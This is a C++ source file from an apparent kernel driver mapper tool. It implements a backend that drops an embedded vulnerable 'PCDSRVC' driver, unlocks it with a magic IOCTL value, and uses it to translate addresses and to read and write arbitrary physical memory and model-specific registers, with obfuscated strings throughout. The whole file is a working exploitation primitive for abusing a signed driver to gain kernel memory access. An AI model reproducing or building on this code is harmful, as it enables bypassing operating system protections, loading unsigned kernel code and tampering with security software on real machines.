#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_PCDSRVC)

#include "PCDSRVCBackend.h"
#include "../Common/vDriverLoader.h"
#include "pcdsrvc_sys.h"
#include <algorithm>
#include <vector>

namespace
{
	constexpr DWORD PcdsrvcUnlockIoctl       = 0x222004;
	constexpr DWORD PcdsrvcV2pIoctl          = 0x222080;
	constexpr DWORD PcdsrvcReadPhysicalIoctl = 0x222084;
	constexpr DWORD PcdsrvcWritePhysicalIoctl = 0x222088;
	constexpr DWORD PcdsrvcReadMsrIoctl      = 0x222180;
	constexpr DWORD PcdsrvcWriteMsrIoctl     = 0x222184;

	constexpr uint32_t UnlockMagic = 0xA1B2C3D4;
}

std::string PCDSRVCBackend::Name( ) const
{
	return pstra( "PCDSRVC" );
}

NTSTATUS PCDSRVCBackend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( pcdsrvc_sys, sizeof( pcdsrvc_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\PCDSRVC{3B54B31B-D06B6431-06020200}_0" ),
		image.data( ), image.size( ), &m_Device, 0x9190,
		pstra( "PCDSRVC{3B54B31B-D06B6431-06020200}_0" ) );
}

NTSTATUS PCDSRVCBackend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "PCDSRVC{3B54B31B-D06B6431-06020200}_0" ) );
}

bool PCDSRVCBackend::UnlockDriver( )
{
	if ( m_Unlocked )
		return true;

	uint32_t magic = UnlockMagic;
	uint32_t response = 0;
	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcUnlockIoctl, &magic, sizeof( magic ), &response, sizeof( response ), &bytesReturned, nullptr ) )
	{
		LOG_SEC( "[-] - [PCDSRVC] UnlockDriver failed gle=%lu", GetLastError( ) );
		return false;
	}

	m_Unlocked = true;
	LOG_SEC( "[+] - [PCDSRVC] Driver unlocked", 0 );
	return true;
}

bool PCDSRVCBackend::GetPhysicalAddress( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	uint64_t va = virtualAddress;
	uint64_t pa = 0;
	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcV2pIoctl, &va, sizeof( va ), &pa, sizeof( pa ), &bytesReturned, nullptr ) )
		return false;

	if ( !pa )
		return false;

	*physicalAddress = pa;
	return true;
}

bool PCDSRVCBackend::ReadPhysical( uint64_t physicalAddress, void* buffer, uint32_t length )
{
	if ( !buffer || !length )
		return false;

	PhysicalMemoryHeader header {};
	header.PhysicalAddress = physicalAddress;
	header.Length = length;
	header.AccessMode = 0;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcReadPhysicalIoctl, &header, sizeof( header ), buffer, length, &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::WritePhysical( uint64_t physicalAddress, const void* buffer, uint32_t length )
{
	if ( !buffer || !length )
		return false;

	std::vector<uint8_t> request( sizeof( PhysicalMemoryHeader ) + length );

	auto header = r_cast<PhysicalMemoryHeader*>( request.data( ) );
	header->PhysicalAddress = physicalAddress;
	header->Length = length;
	header->AccessMode = 0;

	memcpy( request.data( ) + sizeof( PhysicalMemoryHeader ), buffer, length );

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcWritePhysicalIoctl, request.data( ), s_cast<DWORD>( request.size( ) ), nullptr, 0, &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::ReadMsr( uint32_t msrRegister, uint64_t* value )
{
	if ( !value )
		return false;

	MsrAccess access {};
	access.MsrRegister = msrRegister;
	access.Value = 0;

	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcReadMsrIoctl, &access, sizeof( access ), &access, sizeof( access ), &bytesReturned, nullptr ) )
		return false;

	*value = access.Value;
	return true;
}

bool PCDSRVCBackend::WriteMsr( uint32_t msrRegister, uint64_t value )
{
	MsrAccess access {};
	access.MsrRegister = msrRegister;
	access.Value = value;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcWriteMsrIoctl, &access, sizeof( access ), &access, sizeof( access ), &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, uint64_t bytes, bool write )
{
	if ( !buffer || !bytes )
		return false;

	if ( physicalAddress >= 0x10000000000ull )
		return false;

	if ( !UnlockDriver( ) )
		return false;

	while ( bytes )
	{
		const auto chunk = s_cast<uint32_t>( std::min<uint64_t>( bytes, 0x1000 ) );

		bool ok = false;

		if ( write )
			ok = WritePhysical( physicalAddress, buffer, chunk );
		else
			ok = ReadPhysical( physicalAddress, buffer, chunk );

		if ( !ok )
			return false;

		physicalAddress += chunk;
		buffer = r_cast<uint8_t*>( buffer ) + chunk;
		bytes -= chunk;
	}

	return true;
}

bool PCDSRVCBackend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	if ( !UnlockDriver( ) )
		return false;

	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( pageLeft, size - offset ) );

		if ( !GetPhysicalAddress( currentAddress, &physical ) )
		{
			LOG_SEC( "[*] - [PCDSRVC] IOCTL V2P failed, falling back to table walk va=0x%llx", currentAddress );

			if ( !VirtualToPhysicalByTableWalk( currentAddress, &physical ) )
				return false;
		}

		if ( !ReadWritePhysical( physical, bytes + offset, chunk, write ) )
			return false;

		offset += chunk;
	}

	return true;
}




#endif // KZEROMAPPER_ENABLE_PCDSRVC